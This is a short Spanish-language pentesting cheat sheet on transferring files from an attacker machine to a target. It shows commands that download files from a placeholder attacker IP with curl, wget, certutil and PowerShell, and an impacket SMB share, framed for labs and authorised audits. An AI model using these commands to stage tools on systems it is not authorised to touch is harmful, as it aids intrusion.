# Compartir Archivos por la Red

Durante una auditoría es frecuente necesitar transferir archivos entre la máquina atacante y la máquina objetivo (scripts, binarios, herramientas o resultados). A continuación se muestran los métodos más habituales.

---

# Servidor HTTP (Máquina atacante)

Desde el directorio donde se encuentra el archivo:

```bash
python3 -m http.server 80
```

Todos los archivos del directorio estarán disponibles desde:

```text
http://<IP>/
```

---

# Descargar archivos en Linux

## Con curl

```bash
curl -O http://<IP>/<archivo>
```

Guardar con otro nombre:

```bash
curl http://<IP>/<archivo> -o <nuevo_nombre>
```

---

## Con wget

```bash
wget http://<IP>/<archivo>
```

---

# Descargar archivos en Windows

## Certutil

```cmd
certutil -urlcache -split -f http://<IP>/<archivo> <archivo>
```

---

## PowerShell

```powershell
powershell -c "Invoke-WebRequest http://<IP>/<archivo> -OutFile <archivo>"
```

o

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/<archivo>','<archivo>')"
```

---

# Compartir mediante SMB

Levantar un recurso compartido con Impacket:

```bash
impacket-smbserver recurso $(pwd) -smb2support
```

Desde Windows:

```cmd
copy \\<IP>\recurso\<archivo> .
```

o

```cmd
dir \\<IP>\recurso
```

---

# Comprobar la conectividad

Antes de descargar un archivo, verifica que el servidor HTTP responde:

```bash
curl http://<IP>
```

o desde Windows:

```cmd
curl http://<IP>
```

---

# Herramientas útiles

| Herramienta              | Descripción                                                          |
| ------------------------ | -------------------------------------------------------------------- |
| `python3 -m http.server` | Servidor HTTP rápido para compartir archivos.                        |
| `curl`                   | Descarga y envío de archivos mediante HTTP.                          |
| `wget`                   | Descarga de archivos desde HTTP/HTTPS/FTP.                           |
| `certutil`               | Descarga de archivos desde Windows utilizando herramientas nativas.  |
| `PowerShell`             | Descarga de archivos mediante `Invoke-WebRequest` o `Net.WebClient`. |
| `impacket-smbserver`     | Comparte archivos mediante SMB desde la máquina atacante.            |

---

> **Consejo:** Si el puerto **80** está ocupado, puedes utilizar cualquier otro puerto, por ejemplo:

```bash
python3 -m http.server 8080
```

Y descargar el archivo indicando el puerto:

```bash
curl http://<IP>:8080/<archivo>
```

Este método suele ser uno de los más rápidos para transferir herramientas durante laboratorios de Hack The Box, TryHackMe o auditorías autorizadas.
